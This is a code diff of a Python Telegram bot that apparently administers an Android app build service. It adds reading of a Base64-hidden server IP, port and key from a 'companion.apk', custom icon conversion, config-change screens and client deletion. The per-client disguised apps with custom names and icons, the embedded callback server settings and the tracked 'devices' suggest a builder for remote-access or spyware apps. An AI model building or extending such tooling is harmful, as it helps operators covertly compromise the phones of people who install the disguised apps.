@@ -295,6 +295,111 @@ def xor_encrypt(plaintext: str) -> str:
     ).decode("ascii")
 
 
+# ── Companion APK server-config reader ───────────────────────────────────────
+_COMPANION_APK = os.path.join(REPO_DIR, "app", "src", "main", "assets", "companion.apk")
+
+def read_companion_server_config() -> dict:
+    """Read current IP, port, key from companion.apk assets DEX.
+
+    Scans classes.dex for Base64 strings that decode to an IPv4 address,
+    a numeric port, and the key (looked up by known default or by proximity).
+    Returns dict with keys: ip, port, key, ip_b64, port_b64, key_b64.
+    All values are empty string if not found or APK not accessible.
+    """
+    import zipfile, re as _re
+
+    result = {"ip": "", "port": "", "key": "",
+              "ip_b64": "", "port_b64": "", "key_b64": ""}
+    try:
+        if not os.path.isfile(_COMPANION_APK):
+            return result
+        with zipfile.ZipFile(_COMPANION_APK, "r") as z:
+            if "classes.dex" not in z.namelist():
+                return result
+            dex = z.read("classes.dex")
+
+        b64_pat = _re.compile(rb'[A-Za-z0-9+/]{6,}={0,2}')
+
+        found_ip   = ""
+        found_port = ""
+        found_key  = ""
+        found_ip_b64   = ""
+        found_port_b64 = ""
+        found_key_b64  = ""
+
+        for m in b64_pat.finditer(dex):
+            raw = m.group()
+            try:
+                dec = base64.b64decode(raw + b"==").decode("ascii")
+            except Exception:
+                continue
+            # IPv4
+            if not found_ip and _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec):
+                found_ip     = dec
+                found_ip_b64 = raw.decode()
+            # Port (numeric 1024–65535)
+            elif not found_port and _re.match(r'^\d{3,5}$', dec) and 1024 <= int(dec) <= 65535:
+                found_port     = dec
+                found_port_b64 = raw.decode()
+
+        # Key: scan entire DEX (key can be far from IP — 35KB apart in practice).
+        # Criteria: b64 decodes to mixed-case alphanumeric (has BOTH upper & lower),
+        # length 3–32, not all-digits, not IPv4, not all-uppercase Android constant.
+        # Among all candidates, pick the one closest to IP position.
+        ip_pos_abs = dex.find(found_ip_b64.encode()) if found_ip_b64 else len(dex) // 2
+        best_key_dist = None
+        for m in b64_pat.finditer(dex):
+            raw = m.group()
+            # Only pure-alphanumeric base64 tokens (no + or /)
+            if not _re.match(rb'^[A-Za-z0-9]+=*$', raw):
+                continue
+            try:
+                dec = base64.b64decode(raw + b"==").decode("ascii")
+            except Exception:
+                continue
+            if not (3 <= len(dec) <= 32):
+                continue
+            # Decoded value must be fully alphanumeric
+            if not _re.match(r'^[A-Za-z0-9]+$', dec):
+                continue
+            if dec.isdigit():
+                continue
+            if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec):
+                continue
+            # Skip all-uppercase Android constants (e.g. VIEW_ID, SCROLL)
+            if _re.match(r'^[A-Z0-9]{3,}$', dec):
+                continue
+            # Key must be mixed-case: has both uppercase and lowercase letters.
+            # This is the strongest discriminator — real keys like TxTxT have both.
+            has_upper = any(c.isupper() for c in dec)
+            has_lower = any(c.islower() for c in dec)
+            if not (has_upper and has_lower):
+                continue
+            # Skip strings that look like Java class/method names (StartNewScan etc.)
+            # by requiring at least one digit or non-word char pattern,
+            # OR length ≤ 10 (short keys). Longer readable words are likely code names.
+            if len(dec) > 10 and dec.isalpha():
+                continue
+            # Pick candidate closest to IP position in the DEX
+            dist = abs(m.start() - ip_pos_abs)
+            if best_key_dist is None or dist < best_key_dist:
+                found_key      = dec
+                found_key_b64  = raw.decode()
+                best_key_dist  = dist
+
+        result.update({
+            "ip":       found_ip,
+            "port":     found_port,
+            "key":      found_key,
+            "ip_b64":   found_ip_b64,
+            "port_b64": found_port_b64,
+            "key_b64":  found_key_b64,
+        })
+    except Exception:
+        pass
+    return result
+
+
 # ── Git binary auto-detection (Layer 2) ──────────────────────────────────────
 _git_exe   = None  # cached git binary path
 _sync_lock = threading.Lock()  # Layer 3: mutex — no concurrent pulls
@@ -1645,8 +1750,8 @@ def text_custom_icon_prompt(app_name: str) -> str:
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"📛 App Name: {app_name}\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "🖼 Upload app icon (PNG):\n\n"
-        "<i>Send a PNG image (square, min 512×512 recommended)</i>"
+        "🖼 Upload app icon:\n\n"
+        "<i>Send any image (JPG, PNG, WEBP…) — auto-converted to 512×512 PNG</i>"
     )
 
 
@@ -1690,42 +1795,75 @@ def kb_custom_cancel(client_id: int) -> types.InlineKeyboardMarkup:
 
 # ── Server config helpers (IP / Port / Key) ─────────────────────────────────
 
-def text_server_ip_prompt(client_id: int, template: str) -> str:
+def text_server_ip_prompt(client_id: int, template: str,
+                          cfg: dict = None) -> str:
+    """Screen 1: show current companion values + ask for new IP.
+    cfg is from read_companion_server_config(); pass it in to avoid re-reading.
+    """
     db = get_db()
     c  = db.execute(
         "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
     db.close()
     name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
     emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
+    if cfg is None:
+        cfg = read_companion_server_config()
+    if cfg["ip"] or cfg["port"] or cfg["key"]:
+        current_line = (
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "📌 <b>Current in companion:</b>\n"
+            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
+            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
+            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
+        )
+    else:
+        current_line = ""
     return (
         f"🌐 <b>Server Config — {name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"Template: {emoji} {tpl_name}\n"
+        + current_line +
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "📡 Enter server IP:\n\n"
+        "📡 Enter new server IP:\n\n"
         "<i>Example: 192.168.1.100</i>"
     )
 
 
-def text_server_port_prompt(ip: str) -> str:
+def text_server_port_prompt(ip: str, cfg: dict = None) -> str:
+    """Screen 2: show entered IP + hint of current port."""
+    if cfg is None:
+        cfg = read_companion_server_config()
+    current_hint = (
+        f"<i>Current: <code>{cfg['port']}</code></i>\n\n"
+        if cfg.get("port") else ""
+    )
     return (
         "🌐 <b>Server Config</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"📡 IP   : {ip}\n"
+        f"📡 IP   : <code>{ip}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔌 Enter server port:\n\n"
+        + current_hint +
         "<i>Example: 7771</i>"
     )
 
 
-def text_server_key_prompt(ip: str, port: str) -> str:
+def text_server_key_prompt(ip: str, port: str, cfg: dict = None) -> str:
+    """Screen 3: show entered IP+port + hint of current key."""
+    if cfg is None:
+        cfg = read_companion_server_config()
+    current_hint = (
+        f"<i>Current: <code>{cfg['key']}</code></i>\n\n"
+        if cfg.get("key") else ""
+    )
     return (
         "🌐 <b>Server Config</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"📡 IP   : {ip}\n"
-        f"🔌 Port : {port}\n"
+        f"📡 IP   : <code>{ip}</code>\n"
+        f"🔌 Port : <code>{port}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔑 Enter connection key:\n\n"
+        + current_hint +
         "<i>Example: MySecretKey123</i>"
     )
 
@@ -2958,6 +3096,9 @@ def handle_custom_build_name(message):
         custom_build_buf.get(str(m.chat.id), {}).get("step") == "icon"
     ))
 def handle_custom_build_icon(message):
+    import io, os, tempfile
+    from PIL import Image
+
     chat_id = str(message.chat.id)
     if not is_admin(message.chat.id) or not session_valid(message.chat.id):
         return
@@ -2968,27 +3109,97 @@ def handle_custom_build_icon(message):
     except Exception:
         pass
 
-    # Extract file_id — photo (compressed) or document (file attachment)
+    # ── 1. Extract raw file_id from photo or document ────────────────────────
     if message.photo:
-        # Sent as photo: get highest-resolution version (last in array)
+        # Sent as compressed photo — highest resolution last
         file_id = message.photo[-1].file_id
     elif message.document:
-        # Sent as file: validate it's a PNG/image
         mime = message.document.mime_type or ""
         if not mime.startswith("image/"):
             safe_edit(message.chat.id, msg_id,
                       text_custom_icon_prompt(buf["app_name"])
-                      + "\n\n⚠️ <b>Not an image file. Send a PNG image.</b>",
+                      + "\n\n⚠️ <b>Not an image file.</b>\nSend any image (JPG, PNG, WEBP…).",
                       kb_custom_cancel(buf["client_id"]))
             return
         file_id = message.document.file_id
     else:
         return
 
-    buf["icon_file_id"] = file_id
+    # ── 2. Download image from Telegram ──────────────────────────────────────
+    try:
+        file_info   = bot.get_file(file_id)
+        file_bytes  = bot.download_file(file_info.file_path)
+    except Exception as e:
+        safe_edit(message.chat.id, msg_id,
+                  text_custom_icon_prompt(buf["app_name"])
+                  + f"\n\n⚠️ <b>Download failed:</b> {e}\nPlease try again.",
+                  kb_custom_cancel(buf["client_id"]))
+        return
+
+    # ── 3. Convert to professional 512×512 PNG using Pillow ──────────────────
+    try:
+        img = Image.open(io.BytesIO(file_bytes))
+
+        # Normalise color mode — handle palette, RGBA, greyscale, etc.
+        if img.mode == "RGBA":
+            # Composite onto white background so JPG export is clean
+            background = Image.new("RGB", img.size, (255, 255, 255))
+            background.paste(img, mask=img.split()[3])
+            img = background
+        elif img.mode != "RGB":
+            img = img.convert("RGB")
+
+        # Center-crop to square then resize to 512×512
+        w, h   = img.size
+        side   = min(w, h)
+        left   = (w - side) // 2
+        top    = (h - side) // 2
+        img    = img.crop((left, top, left + side, top + side))
+        img    = img.resize((512, 512), Image.LANCZOS)
+
+        # Save as PNG into a temp file
+        tmp_fd, tmp_path = tempfile.mkstemp(suffix=".png")
+        os.close(tmp_fd)
+        img.save(tmp_path, format="PNG", optimize=True)
+
+    except Exception as e:
+        safe_edit(message.chat.id, msg_id,
+                  text_custom_icon_prompt(buf["app_name"])
+                  + f"\n\n⚠️ <b>Image conversion failed:</b> {e}\nPlease try again.",
+                  kb_custom_cancel(buf["client_id"]))
+        return
+
+    # ── 4. Re-upload converted PNG to Telegram to get a stable file_id ───────
+    try:
+        with open(tmp_path, "rb") as f:
+            sent = bot.send_document(
+                message.chat.id,
+                f,
+                visible_file_name="app_icon.png",
+                caption="✅ Icon converted to 512×512 PNG",
+            )
+        new_file_id = sent.document.file_id
+        # Delete the confirmation message so it doesn't clutter the chat
+        try:
+            bot.delete_message(message.chat.id, sent.message_id)
+        except Exception:
+            pass
+    except Exception as e:
+        safe_edit(message.chat.id, msg_id,
+                  text_custom_icon_prompt(buf["app_name"])
+                  + f"\n\n⚠️ <b>Upload failed:</b> {e}\nPlease try again.",
+                  kb_custom_cancel(buf["client_id"]))
+        return
+    finally:
+        try:
+            os.remove(tmp_path)
+        except Exception:
+            pass
+
+    # ── 5. Store new PNG file_id and proceed to server config ─────────────────
+    buf["icon_file_id"] = new_file_id
     buf["step"]         = "done"
     custom_build_buf[chat_id] = buf
-    # Route to server config step (IP → Port → Key)
     server_config_buf[chat_id] = {
         "step": "ip",
         "client_id": buf["client_id"],
@@ -3024,7 +3235,7 @@ def handle_custom_build_icon_reject(message):
         pass
     safe_edit(message.chat.id, msg_id,
               text_custom_icon_prompt(buf["app_name"])
-              + "\n\n⚠️ <b>Please send a PNG image, not text.</b>",
+              + "\n\n⚠️ <b>Please send an image file, not text.</b>",
               kb_custom_cancel(buf["client_id"]))
 
 
@@ -3050,11 +3261,15 @@ def handle_server_config_ip(message):
                   text_server_ip_prompt(buf["client_id"], buf["template"]),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
+    # Cache companion config once here — reused by port/key prompts and confirm
+    if "_companion_cfg" not in buf:
+        buf["_companion_cfg"] = read_companion_server_config()
+    _cfg = buf["_companion_cfg"]
     buf["ip"]   = ip
     buf["step"] = "port"
     server_config_buf[chat_id] = buf
     safe_edit(message.chat.id, msg_id,
-              text_server_port_prompt(ip),
+              text_server_port_prompt(ip, cfg=_cfg),
               kb_server_config_cancel(buf["client_id"], buf["template"]))
 
 
@@ -3073,17 +3288,18 @@ def handle_server_config_port(message):
         bot.delete_message(message.chat.id, message.message_id)
     except Exception:
         pass
+    _cfg = buf.get("_companion_cfg")  # cached from IP step
     port = message.text.strip()
     if not port:
         safe_edit(message.chat.id, msg_id,
-                  text_server_port_prompt(buf["ip"]),
+                  text_server_port_prompt(buf["ip"], cfg=_cfg),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
     buf["port"] = port
     buf["step"] = "key"
     server_config_buf[chat_id] = buf
     safe_edit(message.chat.id, msg_id,
-              text_server_key_prompt(buf["ip"], port),
+              text_server_key_prompt(buf["ip"], port, cfg=_cfg),
               kb_server_config_cancel(buf["client_id"], buf["template"]))
 
 
@@ -3102,44 +3318,76 @@ def handle_server_config_key(message):
         bot.delete_message(message.chat.id, message.message_id)
     except Exception:
         pass
+    _cfg = buf.get("_companion_cfg")  # cached from IP step; fallback below
     key = message.text.strip()
     if not key:
         safe_edit(message.chat.id, msg_id,
-                  text_server_key_prompt(buf["ip"], buf["port"]),
+                  text_server_key_prompt(buf["ip"], buf["port"], cfg=_cfg),
                   kb_server_config_cancel(buf["client_id"], buf["template"]))
         return
     buf["key"]  = key
     buf["step"] = "done"
     server_config_buf[chat_id] = buf
+    # Use cached companion values for before→after diff (avoid re-reading APK)
+    if _cfg is None:
+        _cfg = read_companion_server_config()
+    _old_ip   = _cfg["ip"]   or "—"
+    _old_port = _cfg["port"] or "—"
+    _old_key  = _cfg["key"]  or "—"
+    _new_ip   = buf["ip"]
+    _new_port = buf["port"]
+    _new_key  = buf["key"]
+
+    def _diff(old, new):
+        # Fix 1: use <del> (Telegram HTML), not <s> (unsupported)
+        # Fix 2: show (unchanged) label instead of bare code when same
+        if old == new:
+            return f"<code>{new}</code> (unchanged)"
+        return f"<del>{old}</del> → <code>{new}</code>"
+
+    # Fix 3: diff block is BEFORE build summary — assembled here, prepended below
+    _diff_block = (
+        "🔄 <b>Config Update:</b>\n"
+        f"   📡 IP   : {_diff(_old_ip,   _new_ip)}\n"
+        f"   🔌 Port : {_diff(_old_port, _new_port)}\n"
+        f"   🔑 Key  : {_diff(_old_key,  _new_key)}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+    )
+
     # Show confirmation screen
     template   = buf["template"]
     client_id  = buf["client_id"]
     is_rebuild = buf.get("is_rebuild", False)
     cbuf       = custom_build_buf.get(chat_id)
     if template == "custom" and cbuf:
+        # Fix 3: diff block before build summary
+        # Fix 4: text_custom_build_confirm already ends with "Everything correct?"
+        #         — do NOT append it again
+        # Fix 5: no extra ━ separator between diff block and build summary
         safe_edit(message.chat.id, msg_id,
-                  text_custom_build_confirm(
+                  _diff_block
+                  + text_custom_build_confirm(
                       client_id, cbuf["app_name"],
-                      srv_ip=buf["ip"], srv_port=buf["port"],
-                      srv_key=buf["key"]),
+                      srv_ip=_new_ip, srv_port=_new_port,
+                      srv_key=_new_key),
                   kb_build_confirm(client_id, template))
     elif is_rebuild:
-        # Rebuild flow — show rebuild confirm screen with ✅ Confirm Rebuild button
         safe_edit(message.chat.id, msg_id,
                   f"🔁 <b>Rebuild — confirm config</b>\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"📡 Server IP   : <code>{buf['ip']}</code>\n"
-                  f"🔌 Port        : <code>{buf['port']}</code>\n"
-                  f"🔑 Key         : <code>{buf['key']}</code>\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"Confirm to rebuild with this config:",
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  + _diff_block +
+                  "Confirm to rebuild with this config:",
                   kb_rebuild_confirm(client_id, template))
     else:
+        # Fix 3: diff block before build summary
+        # Fix 4: text_build_confirm already ends with "Everything correct?" — no duplicate
+        # Fix 5: no extra ━ separator
         safe_edit(message.chat.id, msg_id,
-                  text_build_confirm(
+                  _diff_block
+                  + text_build_confirm(
                       client_id, template,
-                      srv_ip=buf["ip"], srv_port=buf["port"],
-                      srv_key=buf["key"]),
+                      srv_ip=_new_ip, srv_port=_new_port,
+                      srv_key=_new_key),
                   kb_build_confirm(client_id, template))
 
 
@@ -3732,11 +3980,22 @@ def handle_callback(call):
     elif data.startswith("confirm_delete_"):
         client_id = int(data.split("_")[2])
         db        = get_db()
-        db.execute(
-            "UPDATE clients SET active=0 WHERE id=?", (client_id,))
-        db.commit()
-        db.close()
-        show_clients(chat_id, msg_id)
+        try:
+            # builds.client_id is NOT NULL — cannot be set to NULL.
+            # Delete builds for this client; devices can be nulled (no NOT NULL constraint).
+            db.execute("DELETE FROM devices WHERE client_id=?", (client_id,))
+            db.execute("DELETE FROM builds  WHERE client_id=?", (client_id,))
+            db.execute("DELETE FROM clients WHERE id=?", (client_id,))
+            db.commit()
+            clients = [dict(c) for c in db.execute(
+                "SELECT * FROM clients ORDER BY id DESC").fetchall()]
+        finally:
+            db.close()
+        try:
+            bot.edit_message_text("🗑 Client deleted.", chat_id, msg_id, parse_mode="HTML")
+        except Exception:
+            pass
+        safe_edit(chat_id, msg_id, text_clients(clients), kb_clients(clients))
 
     elif data.startswith("new_build_"):
         custom_build_buf.pop(str(chat_id), None)
